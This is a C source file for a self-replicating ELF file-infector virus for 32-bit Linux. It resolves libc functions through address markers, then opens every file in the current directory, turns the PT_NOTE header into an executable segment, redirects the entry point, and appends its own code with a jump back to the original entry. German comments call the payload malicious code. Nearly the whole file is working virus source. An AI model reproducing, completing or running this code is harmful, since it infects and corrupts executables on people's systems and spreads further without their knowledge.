#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>
#include <elf.h>
#include <sys/mman.h>

#define MAX_REL 3
#define MARKER 0xf0fffff0
#define FIRST_FUNC  virus_start
#define LAST_FUNC  virus_end

// places string in code section and returns ptr to it
#define STR( str , n ) 	\
	({char* var = 0;	\
	 asm volatile("call after_string"n"\n"	\
		 "  .ascii\"" str "\"\n"	\
		 "  .byte 0\n"			\
		 "after_string"n":\n"		\
		 "  pop %0\n"			\
		 : "=m"(var)			\
		 );				\
	 var; })

enum ADR{MARKO, MARKV, LIBO, 
	OPEN, CLOSE, MMAP, MUNMAP, LSEEK, 
	OPENDIR, READDIR, FDOPEN, FCLOSE, FPUTC, PRINTF};

// functionpointer types
typedef int (*fp_open)(char*, int);
typedef int (*fp_close)(int);

typedef void* (*fp_mmap)(void *, size_t, int prot, int , int, off_t);
typedef int (*fp_munmap)(void*, size_t);

typedef off_t (*fp_lseek)(int, off_t, int);
typedef DIR* (*fp_opendir)(const char*);
typedef struct dirent* (*fp_readdir)(DIR*);

typedef FILE* (*fp_fdopen)(int, const char *);
typedef int (*fp_fclose)(FILE*);
typedef int (*fp_fputc)(int, FILE*);

typedef int (*fp_printf)(const char*, ...);
typedef void (*fp_perror)(const char*);
typedef int (*fp_lstat)(const char*, struct stat*);

void virus_start();
void infect(fp_open 	my_open,
	fp_close 	my_close,
	fp_mmap 	my_mmap,
	fp_munmap 	my_munmap,
	fp_lseek 	my_lseek,
	fp_opendir 	my_opendir,
	fp_readdir 	my_readdir,
	fp_fdopen 	my_fdopen,
	fp_fclose 	my_fclose,
	fp_fputc 	my_fputc,
	fp_printf 	my_printf,
	Elf32_Addr 	v_start,
	size_t 		v_size);
inline char my_strcmp(char* str1, char* str2);
inline Elf32_Addr getBase();
void virus_end();

// start of injected code
void virus_start()
{
	// address of the first virus instruction
	Elf32_Addr 	v_start;
	// get eip
marker:
	asm volatile( " call current_address\n"
			"current_address:\n"
			" pop %0\n"
			: "=m" (v_start));
	v_start = (v_start - 5) - (&&marker - (void*)&FIRST_FUNC);
	Elf32_Addr v_size = (void*)&LAST_FUNC - (void*)&FIRST_FUNC;
	
	fp_open 	my_open;
	fp_close 	my_close;
	fp_mmap 	my_mmap;
	fp_munmap 	my_munmap;
	fp_lseek 	my_lseek;
	fp_opendir 	my_opendir;
	fp_readdir 	my_readdir;
	fp_fdopen 	my_fdopen;
	fp_fclose 	my_fclose;
	fp_fputc 	my_fputc;
	fp_printf 	my_printf;
	// base addr of libc
	Elf32_Addr 	base_addr;

	Elf32_Addr o_open 	= MARKER + OPEN;
	Elf32_Addr o_close 	= MARKER + CLOSE;
	Elf32_Addr o_mmap 	= MARKER + MMAP;
	Elf32_Addr o_munmap 	= MARKER + MUNMAP;
	Elf32_Addr o_lseek 	= MARKER + LSEEK;
	Elf32_Addr o_opendir 	= MARKER + OPENDIR;
	Elf32_Addr o_readdir 	= MARKER + READDIR;
	Elf32_Addr o_fdopen 	= MARKER + FDOPEN;
	Elf32_Addr o_fclose 	= MARKER + FCLOSE;
	Elf32_Addr o_fputc 	= MARKER + FPUTC;
	Elf32_Addr o_printf 	= MARKER + PRINTF;

	base_addr = getBase();

	my_open 	= base_addr + o_open;   
	my_close 	= base_addr + o_close;  
	my_mmap 	= base_addr + o_mmap; 
	my_munmap 	= base_addr + o_munmap; 
	my_lseek 	= base_addr + o_lseek;
	my_opendir 	= base_addr + o_opendir;
	my_readdir 	= base_addr + o_readdir;
	my_fdopen 	= base_addr + o_fdopen;
	my_fclose 	= base_addr + o_fclose;
	my_fputc 	= base_addr + o_fputc;
	my_printf 	= base_addr + o_printf; 

	infect(
			my_open,
			my_close,
			my_mmap,
			my_munmap,
			my_lseek,
			my_opendir,
			my_readdir,
			my_fdopen,
			my_fclose,
			my_fputc,
			my_printf,
			v_start,
			v_size);


}
inline char my_strcmp(char* str1, char* str2)
{		
	int i =0;
	for(i=0; str1[i]!=0 && str2[i]!=0; ++i)
	{
		if(str1[i] != str2[i])
			return 0;
	}
	return str1[i]==str2[i] ? 1 : 0;

}
inline Elf32_Addr getBase()
{
	Elf32_Addr base_addr, marker_addr;
	// get base addr from library function
	// MARKER to be replaced with addr of plt jmp
	asm volatile ("push $0; call *%%eax; pop %%eax;" : : "a"(MARKER+MARKV));
	// 0xfffffff1 to be replaced with addr to got
	asm volatile ("movl (%%eax), %0;"
			:"=r"(marker_addr) : "a"(MARKER+MARKO));
	// 0xfffffff2 to be replaced with offset of marker function 
	Elf32_Addr a = MARKER+LIBO;
	base_addr = marker_addr - a;
	return base_addr;
}
void infect(
		// function pointer
		fp_open 	my_open,
		fp_close 	my_close,
		fp_mmap 	my_mmap,
		fp_munmap 	my_munmap,
		fp_lseek 	my_lseek,
		fp_opendir 	my_opendir,
		fp_readdir 	my_readdir,
		fp_fdopen 	my_fdopen,
		fp_fclose 	my_fclose,
		fp_fputc 	my_fputc,
		fp_printf 	my_printf,
		Elf32_Addr 	v_start,
		size_t 		v_size)
{
	int i,j,k;

	// directory listing
	DIR             *dip;
	struct dirent   *dit;
	int 		fdexe;
	size_t 		size;

	// write virus
	FILE* fpexe;

	// analyze libc
	int 		fdlibc;

	// Elf
	Elf32_Ehdr 	*ehdr;
	// infect binary
	Elf32_Addr 	old_entry; 	// original entry point
	Elf32_Phdr 	*note; 		// NOTE programm header
	Elf32_Phdr 	*phdr;
	int 		v_alignment;
	int 		JMPOEP_SIZE;
	off_t 		v_static_offset;
	off_t 		v_dynamic_address;
	off_t 		v_adjustment;
	// analyse binary
	Elf32_Shdr 	*shdr; 
	//Elf32_Shdr 	*link;
	Elf32_Shdr 	*dynsym; 	// dynamic symbols
	Elf32_Shdr 	*dynamic; 	// dynamic
	Elf32_Shdr 	*string_sec; 	// strings
	Elf32_Shdr 	*rels[MAX_REL];
	Elf32_Rel 	*relplt;
	Elf32_Sym 	*symtab; 	// symbols
	Elf32_Sym 	*psym; 
	Elf32_Dyn 	*dyns;
	char 		*strtab; 	// names
	unsigned long 	strtab_size;
	int 		nrels, nents, isym;
	char*  		name;
	char 		marker_name[256];

	// markers to obtain the base addrress
	Elf32_Addr 	marker_offset, marker_value;
	// needed libc version
	char vlibc[256];
	// actual addresses to be replaced
	Elf32_Addr adr[16];
	Elf32_Addr o_adr[16];

	o_adr[0x0] =  MARKER+0x0;
	o_adr[0x1] =  MARKER+0x1;
	o_adr[0x2] =  MARKER+0x2;
	o_adr[0x3] =  MARKER+0x3;
	o_adr[0x4] =  MARKER+0x4;
	o_adr[0x5] =  MARKER+0x5;
	o_adr[0x6] =  MARKER+0x6;
	o_adr[0x7] =  MARKER+0x7;
	o_adr[0x8] =  MARKER+0x8;
	o_adr[0x9] =  MARKER+0x9;
	o_adr[0xa] =  MARKER+0xa;
	o_adr[0xb] =  MARKER+0xb;
	o_adr[0xc] =  MARKER+0xc;
	o_adr[0xd] =  MARKER+0xd;

	my_printf(STR("Virus reporting in\n", "50"));
	my_printf(STR("printf at %%x\n", "51"), my_printf);
	my_printf(STR("v_start at %%x\n", "52"), v_start);
	my_printf(STR("v_size %%d\n", "53"), v_size);
	dip = my_opendir(STR(".", "00"));
	while ((dit = my_readdir(dip)) != NULL)
	{
		// try to open target
		fdexe = my_open(dit->d_name, O_RDWR);
		if(fdexe<=0) continue; // next

		size = my_lseek(fdexe, 0, SEEK_END);
		ehdr = (Elf32_Ehdr*)my_mmap(0, size,
				PROT_READ|PROT_WRITE, MAP_SHARED, fdexe, 0);
		if(ehdr->e_machine != EM_386) continue; // next

		////////////////////////////////////////////////////////////////////////////////////
		// Infect binary:
		// find and adjust NOTE programm header
		// change entry point
		//
		old_entry = ehdr->e_entry;

		// loacate the NOTE program header
		// the NOTE header is not needed to execute the
		// Program so we reuse it for our purpose
		note = NULL;
		phdr = (Elf32_Phdr*) ((char *)ehdr + ehdr->e_phoff);
		for(i=ehdr->e_phnum; --i>0; ++phdr)
			if(phdr->p_type == PT_NOTE) note = phdr;
		if(note==NULL) 	continue;

		my_printf(STR("Infecting %%s\n", "10"), dit->d_name);

		v_alignment = 0x1000;
		//v_size = virus_end-virus_start; // remember to add jmp OEP
		// offset in file
		v_static_offset = size; // writing our code at the end of the file
		// address in memory during execution
		JMPOEP_SIZE = 35; //
		v_dynamic_address = 0x08048000 - (v_size + JMPOEP_SIZE); // magic
		// die sections beginnen anscheinend offiziell bei 0x0800000
		// inoffiziell werden aber erst adressen ab 0x08048000 verwendet
		// das laesst uns raum um unseren schadcode in dem prozess
		// zu platzieren
		// adjust start address for correct alignment
		v_adjustment = v_static_offset % v_alignment-
			v_dynamic_address % v_alignment; // magic
		if(v_adjustment>0) v_dynamic_address -= v_alignment;
		v_dynamic_address += v_adjustment;

		note->p_type = PT_LOAD;				/* Damit unser code in den dynamischen prozessraum geladen wird*/
		note->p_offset = v_static_offset; 		/* Segment file offset */
		note->p_vaddr = 				/* Segment virtual address */
			note->p_paddr = v_dynamic_address;	/* Segment physical address */
		note->p_filesz =				/* Segment size in file */
			note->p_memsz = v_size + JMPOEP_SIZE;	/* Segment size in memory */
		note->p_flags = PF_R|PF_X;
		note->p_align = v_alignment;			/* Segment alignment, file & memory */

		// neuer entrypoint
		ehdr->e_entry = v_dynamic_address;

		my_printf(STR("New entrypoint %%x\n", "11"), v_dynamic_address);

		////////////////////////////////////////////////////////////////////////////////////
		// Analyze binary:
		// get libc version and offsets
		// find dynamic function suitable for obtaining the base address
		//
		// get section headers
		shdr = (Elf32_Shdr*)(ehdr->e_shoff + (char *)ehdr);
		nrels = 0;
		for (i = ehdr->e_shnum; --i>=0; ++shdr) {
			if (shdr->sh_type == SHT_DYNSYM) {
				dynsym =  shdr;
			} else if (shdr->sh_type == SHT_REL) {
				rels[nrels++] = shdr;
			} else if (shdr->sh_type == SHT_DYNAMIC) {
				dynamic = shdr;
			}
		}
		shdr = (Elf32_Shdr*)(ehdr->e_shoff + (char *)ehdr);

		symtab = (Elf32_Sym*) (dynsym->sh_offset + (char*)ehdr);
		string_sec = shdr + dynsym->sh_link;
		strtab = (char*)(string_sec->sh_offset + (char*)ehdr);
		strtab_size = strtab != NULL ? string_sec->sh_size : 0;

		// get offset for suitable dynamic function
		for(i=0; i<nrels; ++i) {
			nents = rels[i]->sh_size/rels[i]->sh_entsize;
			//if(!my_strcmp(SECTION_NAME(rels[i]), STR(".rel.plt", "14"))) continue;
			relplt = (Elf32_Rel*)(rels[i]->sh_offset + (char*)ehdr);
			//link = shdr + rels[i]->sh_link;
			for(j=0; j<nents; ++j) {
				isym = ELF32_R_SYM(relplt->r_info);
				psym = symtab+isym;
				if(psym->st_value!=0 && relplt->r_offset!=0 )
					//ELF32_R_TYPE(relplt->r_info)==R_386_JUMP_SLOT)
				{
					adr[MARKO] = relplt->r_offset;
					adr[MARKV] = psym->st_value;
					name = strtab + psym->st_name;
					for(k=0; name[k]!=0; ++k)
						marker_name[k] = name[k];
					marker_name[k] = 0;
					my_printf(STR("Using %%s as marker\n", "12"),
							marker_name);
					break;
				}
				++relplt;
			}

		}

		// TODO
		// get libc version
		dyns = (Elf32_Dyn*) (dynamic->sh_offset + (char*)ehdr);
		for (dyns=dynamic; dyns->d_tag!=DT_NULL; ++dyns) {
			if (dyns->d_tag == DT_NEEDED) {
				name = (char*)strtab + dyns->d_un.d_val;
				my_printf(STR("Needed %%s\n", "13"), name);
			}
		}
		my_munmap(ehdr, size);

		////////////////////////////////////////////////////////////////////////////////////
		// Analyze libc
		//
		fdlibc = my_open(STR("/lib/i386-linux-gnu/libc.so.6", "3"), O_RDONLY);
		size = my_lseek(fdlibc, 0, SEEK_END);
		ehdr = (Elf32_Ehdr*)my_mmap(0, size,
				PROT_READ, MAP_SHARED, fdlibc, 0);
		shdr = (Elf32_Shdr*)(ehdr->e_shoff + (char *)ehdr);
		for (i = ehdr->e_shnum; --i>=0; ++shdr) {
			if (shdr->sh_type == SHT_DYNSYM) {
				dynsym =  shdr;
			}
		}
		shdr = (Elf32_Shdr*)(ehdr->e_shoff + (char *)ehdr);
		symtab = (Elf32_Sym*) (dynsym->sh_offset + (char*)ehdr);
		string_sec = shdr + dynsym->sh_link;
		strtab = (char*)(string_sec->sh_offset + (char*)ehdr);
		strtab_size = strtab != NULL ? string_sec->sh_size : 0;

		for (i = 0, psym = symtab;
				i < dynsym->sh_size / dynsym->sh_entsize;
				i++, psym++) {
			name = psym->st_name < strtab_size ? strtab + psym->st_name : "<corrupt>";
			//my_printf(STR("%%x %%s\n", "100"), psym->st_value, name);
			//enum ADR{MARKO, MARKV, LIBO, 
			//	OPEN, CLOSE, MMAP, MUNMAP, LSEEK, 
			//	OPENDIR, READDIR, FDOPEN, FCLOSE, FPUTC, PRINTF};
			if(my_strcmp(name, marker_name))
				adr[LIBO] = psym->st_value;
			if(my_strcmp(name, STR("open", "200"))) {
				adr[OPEN] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "100"), psym->st_value, name);
			} else if(my_strcmp(name, STR("close", "201"))) {
				adr[CLOSE] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "101"), psym->st_value, name);
			} else if(my_strcmp(name, STR("mmap", "202"))) {
				adr[MMAP] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "102"), psym->st_value, name);
			} else if(my_strcmp(name, STR("munmap", "203"))) {
				adr[MUNMAP] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "103"), psym->st_value, name);
			} else if(my_strcmp(name, STR("lseek", "204"))) {
				adr[LSEEK] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "104"), psym->st_value, name);
			} else if(my_strcmp(name, STR("opendir", "205"))) {
				adr[OPENDIR] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "105"), psym->st_value, name);
			} else if(my_strcmp(name, STR("readdir", "206"))) {
				adr[READDIR] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "106"), psym->st_value, name);
			} else if(my_strcmp(name, STR("fdopen", "207"))) {
				adr[FDOPEN] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "107"), psym->st_value, name);
			} else if(my_strcmp(name, STR("fclose", "208"))) {
				adr[FCLOSE] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "108"), psym->st_value, name);
			} else if(my_strcmp(name, STR("fputc", "209"))) {
				adr[FPUTC] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "109"), psym->st_value, name);
			} else if(my_strcmp(name, STR("printf", "210"))) {
				adr[PRINTF] = psym->st_value;
				//my_printf(STR("%%x %%s\n", "110"), psym->st_value, name);
			}
		}
		my_munmap(ehdr, size);
		my_close(fdlibc);

		////////////////////////////////////////////////////////////////////////////////////
		// Attach virus code
		//
		fpexe = my_fdopen(fdexe, STR("ab", "20"));

		char* virus_binary = (char*)v_start;
		char val_written = 0;
		char off_written = 0;
		for(i=0; i<v_size-1; i++) {
			//if(i%16==0)
			//	my_printf(STR("\n", "23"));
			//my_printf(STR("%%2x ", "22"), virus_binary[i]);
			Elf32_Addr a = *((Elf32_Addr*)&virus_binary[i]);
			for(j=0; j<16; ++j) {
				//my_printf(STR("%%x -- %%x,  ", "22"), a,  MARKER+j);
				if(adr[j] != 0 && o_adr[j] != 0 && a == o_adr[j]) {
					my_printf(STR("Replacing %%x with %%x\n", "21"),
							a, adr[j]);
					char* b = (char*)&adr[j];
					for(k=0; k<4; ++k)
						my_fputc(b[k], fpexe);
					//adr[j] = 0;
					i+=4;
					break;
				}
			}
			//my_printf(STR("\n", "23"));
			my_fputc(virus_binary[i], fpexe);
		}
		my_printf(STR("\n", "24"));

		// add jmpoep to end of file
		char* oep = (char*)&old_entry;
		my_fputc(0xb8, fpexe);
		for(i=0; i<4; i++)
			my_fputc(oep[i], fpexe);
		my_fputc(0xff, fpexe);
		my_fputc(0xe0, fpexe);

		my_fclose(fpexe);
		my_close(fdexe);
	}
}
void virus_end()
{
}
// end of injected code

int main(int argc, char** argv)
{
	infect(
			(void*)&open,
			(void*)&close,
			(void*)&mmap,
			(void*)&munmap,
			(void*)&lseek,
			(void*)&opendir,
			(void*)&readdir,
			(void*)&fdopen,
			(void*)&fclose,
			(void*)&fputc,
			(void*)&printf,
			(Elf32_Addr)virus_start,
			virus_end-virus_start);


	return 0;
}
